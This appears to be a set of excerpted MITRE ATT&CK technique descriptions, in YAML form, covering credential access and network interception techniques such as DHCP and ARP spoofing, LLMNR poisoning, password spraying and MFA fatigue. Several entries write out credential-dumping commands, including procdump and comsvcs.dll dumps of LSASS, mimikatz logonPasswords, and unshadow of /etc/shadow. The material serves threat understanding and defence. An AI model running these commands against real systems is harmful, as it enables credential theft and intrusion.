      description: "Adversaries may redirect network traffic to adversary-owned systems
        by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting
        as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle
        (AiTM) position, adversaries may collect network communications, including
        passed credentials, especially those sent over insecure, unencrypted protocols.
        This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040)
        or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP
        is based on a client-server model and has two functionalities: a protocol
        for providing network configuration settings from a DHCP server to a client
        and a mechanism for allocating network addresses to clients.(Citation: rfc2131)
        The typical server-client interaction is as follows: \n\n1. The client broadcasts
        a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which
        includes an available network address. \n\n3. The client broadcasts a `REQUEST`
        message, which includes the network address offered. \n\n4. The server acknowledges
        with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries
        may spoof as a rogue DHCP server on the victim network, from which legitimate
        hosts may receive malicious network configurations. For example, malware can
        act as a DHCP server and provide adversary-owned DNS servers to the victimized
        computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g)
        Through the malicious network configurations, an adversary may achieve the
        AiTM position, route client traffic through adversary-controlled systems,
        and collect information from the client network.\n\nDHCPv6 clients can receive
        network configuration information without being assigned an IP address by
        sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code>
        multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP
        server to respond to this request message with malicious network configurations.\n\nRather
        than establishing an AiTM position, adversaries may also abuse DHCP spoofing
        to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002))
        by generating many broadcast DISCOVER messages to exhaust a network’s DHCP
        allocation pool. "

      description: "By responding to LLMNR/NBT-NS network traffic, adversaries may
        spoof an authoritative source for name resolution to force communication with
        an adversary controlled system. This activity may be used to collect or relay
        authentication materials. \n\nLink-Local Multicast Name Resolution (LLMNR)
        and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve
        as alternate methods of host identification. LLMNR is based upon the Domain
        Name System (DNS) format and allows hosts on the same local link to perform
        name resolution for other hosts. NBT-NS identifies systems on a local network
        by their NetBIOS name. (Citation: Wikipedia LLMNR)(Citation: TechNet NetBIOS)\n\nAdversaries
        can spoof an authoritative source for name resolution on a victim network
        by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know
        the identity of the requested host, effectively poisoning the service so that
        the victims will communicate with the adversary controlled system. If the
        requested host belongs to a resource that requires identification/authentication,
        the username and NTLMv2 hash will then be sent to the adversary controlled
        system. The adversary can then collect the hash information sent over the
        wire through tools that monitor the ports for traffic or through [Network
        Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes
        offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to
        obtain the plaintext passwords.\n\nIn some cases where an adversary has access
        to a system that is in the authentication path between systems or when automated
        scans that use credentials attempt to authenticate to an adversary controlled
        system, the NTLMv1/v2 hashes can be intercepted and relayed to access and
        execute code against a target system. The relay step can happen in conjunction
        with poisoning but may also be independent of it.(Citation: byt3bl33d3r NTLM
        Relaying)(Citation: Secure Ideas SMB Relay) Additionally, adversaries may
        encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB,
        MSSQL and HTTP, to expand and use multiple services with the valid NTLM response. \n\nSeveral
        tools may be used to poison name services within local networks such as NBNSpoof,
        Metasploit, and [Responder](https://attack.mitre.org/software/S0174).(Citation:

      name: 'OS Credential Dumping: LSASS Memory'
      description: |
        Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).

        As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.

        For example, on the target host use procdump:

        * <code>procdump -ma lsass.exe lsass_dump</code>

        Locally, mimikatz can be run using:

        * <code>sekurlsa::Minidump lsassdump.dmp</code>
        * <code>sekurlsa::logonPasswords</code>

        Built-in Windows tools such as `comsvcs.dll` can also be used:

        * <code>rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)

        Similar to [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012), the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).(Citation: Deep Instinct LSASS)

        Windows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)

        The following SSPs can be used to access credentials:

        * Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.

      description: "Adversaries may use a single or small list of commonly used passwords
        against many different accounts to attempt to acquire valid account credentials.
        Password spraying uses one password (e.g. 'Password01'), or a small list of
        commonly used passwords, that may match the complexity policy of the domain.
        Logins are attempted with that password against many different accounts on
        a network to avoid account lockouts that would normally occur when brute forcing
        a single account with many passwords. (Citation: BlackHillsInfosec Password
        Spraying)\n\nTypically, management services over commonly used ports are used
        when password spraying. Commonly targeted services include the following:\n\n*
        SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP
        & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services
        (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n*
        Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to
        management services, adversaries may \"target single sign-on (SSO) and cloud-based
        applications utilizing federated authentication protocols,\" as well as externally
        facing email applications, such as Office 365.(Citation: US-CERT TA18-068A
        2018)\n\nIn order to avoid detection thresholds, adversaries may deliberately
        throttle password spraying attempts to avoid triggering security alerting.
        Additionally, adversaries may leverage LDAP and Kerberos authentication attempts,
        which are less likely to trigger high-visibility events such as Windows \"logon
        failure\" event ID 4625 that is commonly triggered by failed SMB connection
        attempts.(Citation: Microsoft Storm-0940)  "

      name: Steal or Forge Authentication Certificates
      description: |-
        Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Entra ID device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.(Citation: O365 Blog Azure AD Device IDs)(Citation: Microsoft AD CS Overview)

        Authentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files)(Citation: APT29 Deep Look at Credential Roaming), misplaced certificate files (i.e. [Unsecured Credentials](https://attack.mitre.org/techniques/T1552)), or directly from the Windows certificate store via various crypto APIs.(Citation: SpecterOps Certified Pre Owned)(Citation: GitHub CertStealer)(Citation: GitHub GhostPack Certificates) With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA). This enrollment process defines various settings and permissions associated with the certificate. Of note, the certificate’s extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificate’s subject alternative name (SAN) values define the certificate owner’s alternate names.(Citation: Medium Certified Pre Owned)

        Abusing certificates for authentication credentials may enable other behaviors such as [Lateral Movement](https://attack.mitre.org/tactics/TA0008). Certificate-related misconfigurations may also enable opportunities for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enable [Persistence](https://attack.mitre.org/tactics/TA0003) via stealing or forging certificates that can be used as [Valid Accounts](https://attack.mitre.org/techniques/T1078) for the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts.

        Adversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establish [Persistence](https://attack.mitre.org/tactics/TA0003) by forging arbitrary authentication certificates for the victim domain (known as “golden” certificates).(Citation: Medium Certified Pre Owned) Adversaries may also target certificates and related services in order to access other forms of credentials, such as [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) ticket-granting tickets (TGT) or NTLM plaintext.(Citation: Medium Certified Pre Owned)

      description: |-
        Adversaries may search the command history on compromised systems for insecurely stored credentials.

        On Linux and macOS systems, shells such as Bash and Zsh keep track of the commands users type on the command-line with the "history" utility. Once a user logs out, the history is flushed to the user's history file. For each user, this file resides at the same location: for example, `~/.bash_history` or `~/.zsh_history`. Typically, these files keeps track of the user's last 1000 commands.

        On Windows, PowerShell has both a command history that is wiped after the session ends, and one that contains commands used in all sessions and is persistent. The default location for persistent history can be found in `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`, but command history can also be accessed with `Get-History`. Command Prompt (CMD) on Windows does not have persistent history.(Citation: Microsoft about_History)(Citation: Medium)

        Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials.(Citation: External to DA, the OS X Way)

        Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.

        It is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).(Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.(Citation: SRD GPP)

        In cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.(Citation: Unit 42 Hildegard Malware) They may also be found as parameters to deployment commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.(Citation: Specter Ops - Cloud Credential Storage)

      name: Steal Application Access Token
      description: "Adversaries can steal application access tokens as a means of
        acquiring credentials to access remote systems and resources.\n\nApplication
        access tokens are used to make authorized API requests on behalf of a user
        or service and are commonly used as a way to access resources in cloud and
        container-based applications and software-as-a-service (SaaS).(Citation: Auth0
        - Why You Should Always Use Access Tokens to Secure APIs Sept 2019)  Adversaries
        who steal account API tokens in cloud and containerized environments may be
        able to access data and perform actions with the permissions of these accounts,
        which can lead to privilege escalation and further compromise of the environment.\n\nFor
        example, in Kubernetes environments, processes running inside a container
        may communicate with the Kubernetes API server using service account tokens.
        If a container is compromised, an adversary may be able to steal the container’s
        token and thereby gain access to Kubernetes API commands.(Citation: Kubernetes
        Service Accounts)  \n\nSimilarly, instances within continuous-development
        / continuous-integration (CI/CD) pipelines will often use API tokens to authenticate
        to other services for testing and deployment.(Citation: Cider Security Top
        10 CICD Security Risks) If these pipelines are compromised, adversaries may
        be able to steal these tokens and leverage their privileges. \n\nIn Azure,
        an adversary who compromises a resource with an attached Managed Identity,
        such as an Azure VM, can request short-lived tokens through the Azure Instance
        Metadata Service (IMDS). These tokens can then facilitate unauthorized actions
        or further access to other Azure services, bypassing typical credential-based
        authentication.(Citation: Entra Managed Identities 2025)(Citation: SpecterOps
        Managed Identity 2022)\n\nToken theft can also occur through social engineering,
        in which case user action may be required to grant access. OAuth is one commonly
        implemented framework that issues tokens to users for access to systems. An
        application desiring access to cloud-based services or protected APIs can
        gain entry using OAuth 2.0 through a variety of authorization protocols. An
        example commonly-used sequence is Microsoft's Authorization Code Grant flow.(Citation:
        Microsoft Identity Platform Protocols May 2019)(Citation: Microsoft - OAuth
        Code Authorization flow - June 2019) An OAuth access token enables a third-party
        application to interact with resources containing user data in the ways requested
        by the application without obtaining user credentials. \n \nAdversaries can
        leverage OAuth authorization by constructing a malicious application designed
        to be granted access to resources with the target user's OAuth token.(Citation:
        Amnesty OAuth Phishing Attacks, August 2019)(Citation: Trend Micro Pawn Storm
        OAuth 2017) The adversary will need to complete registration of their application
        with the authorization server, for example Microsoft Identity Platform using
        Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell,
        or REST API calls.(Citation: Microsoft - Azure AD App Registration - May 2019)
        Then, they can send a [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002)
        to the target user to entice them to grant access to the application. Once
        the OAuth access token is granted, the application can gain potentially long-term
        access to features of the user account through [Application Access Token](https://attack.mitre.org/techniques/T1550/001).(Citation:
        Microsoft - Azure AD Identity Tokens - Aug 2019)\n\nApplication access tokens
        may function within a limited lifetime, limiting how long an adversary can
        utilize the stolen token. However, in some cases, adversaries can also steal
        application refresh tokens(Citation: Auth0 Understanding Refresh Tokens),
        allowing them to obtain new access tokens without prompting the user.  "

      description: |-
        Adversaries may attempt to bypass multi-factor authentication (MFA) mechanisms and gain access to accounts by generating MFA requests sent to users.

        Adversaries in possession of credentials to [Valid Accounts](https://attack.mitre.org/techniques/T1078) may be unable to complete the login process if they lack access to the 2FA or MFA mechanisms required as an additional credential and security control. To circumvent this, adversaries may abuse the automatic generation of push notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta, or similar services to have the user grant access to their account. If adversaries lack credentials to victim accounts, they may also abuse automatic push notification generation when this option is configured for self-service password reset (SSPR).(Citation: Obsidian SSPR Abuse 2023)

        In some cases, adversaries may continuously repeat login attempts in order to bombard users with MFA push notifications, SMS messages, and phone calls, potentially resulting in the user finally accepting the authentication request in response to “MFA fatigue.”(Citation: Russian 2FA Push Annoyance - Cimpanu)(Citation: MFA Fatigue Attacks - PortSwigger)(Citation: Suspected Russian Activity Targeting Government and Business Entities Around the Globe)

        Adversaries may directly collect unsecured credentials stored or passed through user communication services. Credentials may be sent and stored in user chat communication applications such as email, chat services like Slack or Teams, collaboration tools like Jira or Trello, and any other services that support user communication. Users may share various forms of credentials (such as usernames and passwords, API keys, or authentication tokens) on private or public corporate internal communications channels.

        Rather than accessing the stored chat logs (i.e., [Credentials In Files](https://attack.mitre.org/techniques/T1552/001)), adversaries may directly access credentials within these services on the user endpoint, through servers hosting the services, or through administrator portals for cloud hosted services. Adversaries may also compromise integration tools like Slack Workflows to automatically search through messages to extract user credentials. These credentials may then be abused to perform follow-on activities such as lateral movement or privilege escalation (Citation: Slack Security Risks).

      name: Exploitation for Credential Access
      description: |-
        Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. 

        Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)

        Such exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)

        Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.

        Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).

        Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs)

        Adversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., [Browser Information Discovery](https://attack.mitre.org/techniques/T1217) and/or [Application Window Discovery](https://attack.mitre.org/techniques/T1010)) to spoof prompts when users are naturally accessing sensitive sites/data.

        TrendMicro Pawn Storm Dec 2020) Without knowledge of the password for an account
        or set of accounts, an adversary may systematically guess the password using
        a repetitive or iterative mechanism.(Citation: Dragos Crashoverride 2018)
        Brute forcing passwords can take place via interaction with a service that
        will check the validity of those credentials or offline against previously
        acquired credential data, such as password hashes.\n\nBrute forcing credentials
        may take place at various points during a breach. For example, adversaries
        may attempt to brute force access to [Valid Accounts](https://attack.mitre.org/techniques/T1078)
        within a victim environment leveraging knowledge gathered from other post-compromise
        behaviors such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003),
        [Account Discovery](https://attack.mitre.org/techniques/T1087), or [Password
        Policy Discovery](https://attack.mitre.org/techniques/T1201). Adversaries
        may also combine brute forcing activity with behaviors such as [External Remote
        Services](https://attack.mitre.org/techniques/T1133) as part of Initial Access.
        \n\nIf an adversary guesses the correct password but fails to login to a compromised
        account due to location-based conditional access policies, they may change

      description: |-
        Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.

        Credential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.

        Typically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:

        * SSH (22/TCP)
        * Telnet (23/TCP)
        * FTP (21/TCP)
        * NetBIOS / SMB / Samba (139/TCP & 445/TCP)
        * LDAP (389/TCP)
        * Kerberos (88/TCP)
        * RDP / Terminal Services (3389/TCP)
        * HTTP/HTTP Management Services (80/TCP & 443/TCP)
        * MSSQL (1433/TCP)
        * Oracle (1521/TCP)
        * MySQL (3306/TCP)
        * VNC (5900/TCP)

        In addition to management services, adversaries may "target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols," as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)

      description: "Adversaries may disable or modify multi-factor authentication
        (MFA) mechanisms to enable persistent access to compromised accounts.\n\nOnce
        adversaries have gained access to a network by either compromising an account
        lacking MFA or by employing an MFA bypass method such as [Multi-Factor Authentication
        Request Generation](https://attack.mitre.org/techniques/T1621), adversaries
        may leverage their access to modify or completely disable MFA defenses. This
        can be accomplished by abusing legitimate features, such as excluding users
        from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled
        MFA method, or by manually patching MFA programs and configuration files to
        bypass expected functionality.(Citation: Mandiant APT42)(Citation: Azure AD
        Conditional Access Exclusions)\n\nFor example, modifying the Windows hosts
        file (`C:\\windows\\system32\\drivers\\etc\\hosts`) to redirect MFA calls
        to localhost instead of an MFA server may cause the MFA process to fail. If
        a \"fail open\" policy is in place, any otherwise successful authentication
        attempt may be granted access without enforcing MFA. (Citation: Russians Exploit
        Default MFA Protocol - CISA March 2022) \n\nDepending on the scope, goals,
        and privileges of the adversary, MFA defenses may be disabled for individual

      name: Forced Authentication
      description: |+
        Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.

        The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system.(Citation: Wikipedia Server Message Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.

        Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443.(Citation: Didier Stevens WebDAV Traffic)(Citation: Microsoft Managing WebDAV Security)

        Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary  (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource, it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary-controlled server.(Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking to gain access to plaintext credentials.(Citation: Cylance Redirect to SMB)

        There are several different ways this can occur.(Citation: Osanda Stealing NetNTLM Hashes) Some specifics from in-the-wild use include:

        * A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)). The document can include, for example, a request similar to <code>file[:]//[remote address]/Normal.dotm</code> to trigger the SMB request.(Citation: US-CERT APT Energy Oct 2017)
        * A modified .LNK or .SCF file with the icon filename pointing to an external reference such as <code>\\[remote address]\pic.png</code> that will force the system to load the resource when the icon is rendered to repeatedly gather credentials.(Citation: US-CERT APT Energy Oct 2017)

        Alternatively, by leveraging the <code>EfsRpcOpenFileRaw</code> function, an adversary can send SMB requests to a remote system's MS-EFSRPC interface and force the victim computer to initiate an authentication procedure and share its authentication details. The Encrypting File System Remote Protocol (EFSRPC) is a protocol used in Windows networks for maintenance and management operations on encrypted data that is stored remotely to be accessed over a network. Utilization of <code>EfsRpcOpenFileRaw</code> function in EFSRPC is used to open an encrypted object on the server for backup or restore. Adversaries can collect this data and abuse it as part of a NTLM relay attack to gain access to remote systems on the same internal network.(Citation: Rapid7)(Citation: GitHub)

      name: ARP Cache Poisoning
      description: |
        Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).

        The ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.

        An adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.

        The ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)

        Adversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)

      description: "Adversaries may disable or modify conditional access policies
        to enable persistent access to compromised accounts. Conditional access policies
        are additional verifications used by identity providers and identity and access
        management systems to determine whether a user should be granted access to
        a resource.\n\nFor example, in Entra ID, Okta, and JumpCloud, users can be
        denied access to applications based on their IP address, device enrollment
        status, and use of multi-factor authentication.(Citation: Microsoft Conditional
        Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional
        Access Policies) In some cases, identity providers may also support the use
        of risk-based metrics to deny sign-ins based on a variety of indicators. In
        AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary
        constraints such as the source IP, the date the request was made, and the
        nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation:
        GCP IAM Conditions) These measures help to prevent compromised credentials
        from resulting in unauthorized access to data or resources, as well as limit
        user permissions to only those required. \n\nBy modifying conditional access
        policies, such as adding additional trusted IP ranges, removing [Multi-Factor
        Authentication](https://attack.mitre.org/techniques/T1556/006) requirements,
        or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535),

      description: "Adversaries may acquire credentials from cloud-native secret management
        solutions such as AWS Secrets Manager, GCP Secret Manager, Azure Key Vault,
        and Terraform Vault.  \n\nSecrets managers support the secure centralized
        management of passwords, API keys, and other credential material. Where secrets
        managers are in use, cloud services can dynamically acquire credentials via
        API requests rather than accessing secrets insecurely stored in plain text
        files or environment variables.  \n\nIf an adversary is able to gain sufficient
        privileges in a cloud environment – for example, by obtaining the credentials
        of high-privileged [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)
        or compromising a service that has permission to retrieve secrets – they may
        be able to request secrets from the secrets manager. This can be accomplished
        via commands such as `get-secret-value` in AWS, `gcloud secrets describe`
        in GCP, and `az key vault secret show` in Azure.(Citation: Permiso Scattered

        Adversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information, including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user.(Citation: Linux Password and Shadow File Formats)

        Linux stores user information such as user ID, group ID, home directory path, and login shell in <code>/etc/passwd</code>. A "user" on the system may belong to a person or a service. All password hashes are stored in <code>/etc/shadow</code> - including entries for users with no passwords and users with locked or disabled accounts.(Citation: Linux Password and Shadow File Formats)

        Adversaries may attempt to read or dump the <code>/etc/passwd</code> and <code>/etc/shadow</code> files on Linux systems via command line utilities such as the <code>cat</code> command.(Citation: Arctic Wolf) Additionally, the Linux utility <code>unshadow</code> can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper - for example, via the command <code>/usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>(Citation: nixCraft - John the Ripper). Since the user information stored in <code>/etc/passwd</code> are linked to the password hashes in <code>/etc/shadow</code>, an adversary would need to have access to both.

      description: |-
        Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).(Citation: Microsoft Credential Manager store)(Citation: Microsoft Credential Locker)

        The Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of [Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003), Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.

        Credential Lockers store credentials in encrypted `.vcrd` files, located under `%Systemdrive%\Users\\[Username]\AppData\Local\Microsoft\\[Vault/Credentials]\`. The encryption key can be found in a file named <code>Policy.vpol</code>, typically located in the same folder as the credentials.(Citation: passcape Windows Vault)(Citation: Malwarebytes The Windows Vault)

        Adversaries may list credentials managed by the Windows Credential Manager through several mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as <code>CredEnumerateA</code>, may also be absued to list credentials managed by the Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)

        Adversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> then selecting the “Back up...” button on the “Stored User Names and Passwords” GUI.

        Password recovery tools may also obtain plain text passwords from the Credential Manager.(Citation: Malwarebytes The Windows Vault)

      name: Reversible Encryption
      description: |-
        An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The <code>AllowReversiblePasswordEncryption</code> property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.(Citation: store_pwd_rev_enc)

        If the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:

        1. Encrypted password (<code>G$RADIUSCHAP</code>) from the Active Directory user-structure <code>userParameters</code>
        2. 16 byte randomly-generated value (<code>G$RADIUSCHAPKEY</code>) also from <code>userParameters</code>
        3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>)
        4. Static key hardcoded in the Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>)

        With this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.(Citation: how_pwd_rev_enc_1)(Citation: how_pwd_rev_enc_2)

        An adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to "Windows Server 2008" or higher.(Citation: dump_pwd_dcsync) In PowerShell, an adversary may make associated changes to user settings using commands similar to <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>.

      name: Multi-Factor Authentication Interception
      description: "Adversaries may target multi-factor authentication (MFA) mechanisms,
        (i.e., smart cards, token generators, etc.) to gain access to credentials
        that can be used to access systems, services, and network resources. Use of
